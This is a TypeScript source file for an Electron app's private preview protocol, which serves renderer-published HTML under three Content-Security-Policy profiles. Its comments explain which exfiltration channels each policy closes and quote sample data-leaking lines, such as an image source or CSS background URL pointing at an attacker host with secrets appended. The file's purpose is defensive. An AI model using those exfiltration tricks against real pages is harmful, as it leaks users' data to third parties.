// A private scheme for preview documents that need to run scripts.
//
// The renderer's CSP is `script-src 'self'`, and an `about:srcdoc` frame
// inherits its embedder's policy — so a compiled React component dropped
// into a srcDoc iframe is refused before it runs. A document fetched over
// a real scheme carries its own policy instead, which is what this is:
// the renderer publishes a finished document, gets back an
// `overcli-preview://` URL, and points an iframe at it.
//
// The handler serves nothing but documents the renderer published this
// session. It has no filesystem access and no directory listing — the
// only way to get bytes out of it is to have put them in.

import { protocol } from 'electron';
import { randomUUID } from 'node:crypto';

export const PREVIEW_SCHEME = 'overcli-preview';
export const PREVIEW_HOST = 'render';

/// Enough for the frame on screen plus the last few reloads; anything
/// older is unreachable anyway once its URL is gone.
const MAX_DOCUMENTS = 8;
/// A bundled component with React inlined is a few hundred KB. A ceiling
/// well above that still refuses a runaway payload.
const MAX_DOCUMENT_BYTES = 32 * 1024 * 1024;

/// What a published document is allowed to do. Both policies replace the
/// app's own rather than extending it, and neither grants same-origin — the
/// frame that renders them is `sandbox="allow-scripts allow-popups"`, so a
/// preview can never reach the app's storage, its IPC bridge, or the file
/// system. Its popups are all denied by main's window-open handler, which
/// bounces plain web URLs to the user's browser instead.
///
///   - `bundle`: a component Overcli compiled itself. Everything it needs is
///     already inlined, so no remote script is allowed at all.
///   - `local`: a document Overcli produced by converting a local file — a
///     Quick Look rendering of a .pptx, say. It is static markup: inline
///     styles and `data:` images, no script and nothing to fetch. Granting it
///     anything remote would mean a deck that references an external image
///     could phone home just because someone previewed it.
///   - `document`: a self-contained .html file someone wrote. These are
///     overwhelmingly CDN pages — React/Vue/Tailwind from unpkg or jsdelivr,
///     Babel standalone compiling JSX in the page — which is exactly the
///     shape Overcli's own flows tell agents to produce. Refusing remote
///     script renders them as a blank white frame, which is what this
///     policy exists to stop, so it allows https: script and the `eval`
///     an in-page compiler runs on.
export type PreviewPolicy = 'bundle' | 'local' | 'document';

const BASE_CSP = [
  "default-src 'none'",
  "style-src 'unsafe-inline'",
  "frame-src 'none'",
  "form-action 'none'",
];

/// Remote fetches a previewed page may make for *display*. Allowed on
/// `bundle`, withheld from `document`: on `document` every one of these is a
/// one-line exfiltration channel (`new Image().src = 'https://…?d=' + data`)
/// that `connect-src 'none'` does not govern. `style-src https:` is a display
/// channel for the same reason — an attacker-hosted stylesheet can carry
/// exfiltrated data as `background: url(...)` — so it lives here rather than
/// in `BASE_CSP`.
const REMOTE_DISPLAY_CSP = [
  "style-src 'unsafe-inline' https:",
  'img-src data: blob: https:',
  'font-src data: https:',
  'media-src data: blob: https:',
];

const LOCAL_DISPLAY_CSP = ['img-src data: blob:', 'font-src data:', 'media-src data: blob:'];

/// `document`'s directives, spelled out in full rather than composed from
/// BASE_CSP + LOCAL_DISPLAY_CSP. CSP keeps only the FIRST occurrence of a
/// directive and silently drops later duplicates, so `style-src` and
/// `font-src` have to be widened where they are first stated — appending a
/// second copy would have no effect at all.
///
/// The two Google font hosts are the one remote display channel this policy
/// grants, and they are pinned by host for a specific reason. The blanket
/// `https:` that REMOTE_DISPLAY_CSP allows is an exfiltration channel because
/// the page picks the origin: `background: url(https://attacker/?d=secret)`
/// puts the data in someone else's access log. Pinning to fonts.gstatic.com
/// and fonts.googleapis.com removes exactly that — a page can still encode
/// data into the URL, but only Google can read the result, and the page
/// already gets `script-src https:` here, which is a far larger grant.
///
/// What this buys: a design canvas from `/design` declares its typefaces as a
/// Google Fonts <link>. Without these two hosts every face silently falls
/// back to a system font, which on a design mockup does not read as a missing
/// feature — it reads as the design.
const DOCUMENT_CSP = [
  "default-src 'none'",
  "frame-src 'none'",
  "form-action 'none'",
  "style-src 'unsafe-inline' https://fonts.googleapis.com",
  'img-src data: blob:',
  'font-src data: https://fonts.gstatic.com',
  'media-src data: blob:',
  "connect-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval' https:",
];

const CSP_BY_POLICY: Record<PreviewPolicy, string> = {
  // No script and no network at all: everything this document needs to render
  // is already inside it.
  local: [...BASE_CSP, ...LOCAL_DISPLAY_CSP, "connect-src 'none'", "script-src 'none'"].join('; '),
  bundle: [...BASE_CSP, ...REMOTE_DISPLAY_CSP, 'connect-src https:', "script-src 'unsafe-inline'"].join('; '),
  // `document` runs REMOTE script (see the type doc above — CDN pages are the
  // point), and CSP has no directive that limits what a script does once it
  // has loaded: `script-src https:` is itself a fetch of attacker-influenced
  // content, and a running script can still exfiltrate by requesting a new
  // `<script src>` or navigating an `<img>`/`<a>` with data appended to the
  // URL. `connect-src 'none'` plus the data:/blob:-only image/font/media
  // directives close every channel a document does NOT need in order to
  // render; they narrow this policy, they do not seal it. Treat `document`
  // as trusted-content-only, not as a sandbox for untrusted HTML.
  document: DOCUMENT_CSP.join('; '),
};

interface PublishedDocument {
  html: string;
  policy: PreviewPolicy;
}

const documents = new Map<string, PublishedDocument>();

/// Must run before the app is ready — Electron only accepts scheme
/// privileges that early.
export function registerPreviewScheme(): void {
  protocol.registerSchemesAsPrivileged([
    {
      scheme: PREVIEW_SCHEME,
      privileges: { standard: true, secure: true, supportFetchAPI: false, corsEnabled: false },
    },
  ]);
}

export function handlePreviewProtocol(): void {
  protocol.handle(PREVIEW_SCHEME, (request) => {
    const doc = documents.get(documentIdFromUrl(request.url) ?? '');
    if (doc == null) {
      return new Response('This preview is no longer available. Reload it.', {
        status: 404,
        headers: { 'content-type': 'text/plain; charset=utf-8' },
      });
    }
    return new Response(doc.html, {
      headers: {
        'content-type': 'text/html; charset=utf-8',
        'content-security-policy': CSP_BY_POLICY[doc.policy],
        'cache-control': 'no-store',
      },
    });
  });
}

export function publishPreviewDocument(
  html: string,
  policy: PreviewPolicy = 'bundle',
): { ok: true; url: string } | { ok: false; error: string } {
  if (typeof html !== 'string' || !html) return { ok: false, error: 'Preview document is empty.' };
  if (Buffer.byteLength(html, 'utf-8') > MAX_DOCUMENT_BYTES) {
    return { ok: false, error: 'Preview document is too large to render.' };
  }
  const id = randomUUID();
  // `in` walks the prototype chain, so 'toString'/'constructor'/'__proto__'
  // pass and `CSP_BY_POLICY[doc.policy]` then serves an unparseable header —
  // which makes the browser discard the ENTIRE policy, `default-src 'none'`
  // included.
  documents.set(id, { html, policy: Object.hasOwn(CSP_BY_POLICY, policy) ? policy : 'bundle' });
  while (documents.size > MAX_DOCUMENTS) {
    const oldest = documents.keys().next();
    if (oldest.done) break;
    documents.delete(oldest.value);
  }
  return { ok: true, url: `${PREVIEW_SCHEME}://${PREVIEW_HOST}/${id}` };
}

export function documentIdFromUrl(url: string): string | null {
  try {
    const parsed = new URL(url);
    const id = parsed.pathname.replace(/^\/+/, '');
    return id || null;
  } catch {
    return null;
  }
}

/// Test seam: the store is process-wide, so tests need a way back to zero.
export function resetPreviewDocuments(): void {
  documents.clear();
}
